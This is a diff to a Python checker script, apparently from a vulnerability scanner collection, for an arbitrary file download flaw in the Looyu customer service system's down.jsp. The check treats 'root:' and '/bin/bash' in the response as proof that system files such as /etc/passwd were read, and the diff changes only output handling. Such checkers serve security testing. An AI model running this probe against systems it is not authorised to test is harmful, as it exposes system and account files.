@@ -8,8 +8,8 @@ description: 乐语客服系统down.jsp文件file参数未过滤导致任意文�
 '''
 import sys
 import requests
-import warnings
-from termcolor import cprint
+
+
 
 class looyu_down_filedownload_BaseVerify:
     def __init__(self, url):
@@ -22,12 +22,12 @@ class looyu_down_filedownload_BaseVerify:
             req = requests.get(vulnurl, timeout=10, verify=False)
 
             if r"root:" in req.text and r"/bin/bash" in req.text:
-                cprint("[+]存在乐语客服系统任意文件下载漏洞...(高危)\tpayload: "+vulnurl, "red")
+                return "[+]存在乐语客服系统任意文件下载漏洞...(高危)\tpayload: "+vulnurl
 
         except:
-            cprint("[-] "+__file__+"====>连接超时", "cyan")
+            return "[-]connect timeout"
 
 if __name__ == "__main__":
-    warnings.filterwarnings("ignore")
+
     testVuln = looyu_down_filedownload_BaseVerify(sys.argv[1])
     testVuln.run()
